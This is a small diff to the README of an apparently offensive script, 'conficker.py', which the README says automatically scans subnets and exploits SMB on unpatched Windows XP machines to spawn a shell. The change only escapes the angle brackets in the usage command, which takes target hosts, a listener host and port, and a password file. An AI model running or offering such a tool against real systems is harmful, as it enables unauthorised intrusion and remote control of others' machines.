@@ -4,7 +4,7 @@ conficker
 scan and exploit SMB on unpatched Win XP boxes automatically to spawn shell (scans subnets with CIDR notation)
 
 USAGE: <br/>
-python conficker.py -H <RHOSTS> -l <LHOST> [-p <LPORT> -F <Password File>]
+python conficker.py -H &#60; RHOSTS &#62; -l &#60; LHOST &#62; [-p &#60; LPORT &#62; -F &#60; Password File &#62;]
 
 LPORT and Password File parameters are optional. LPORT defaults to 1337.
 
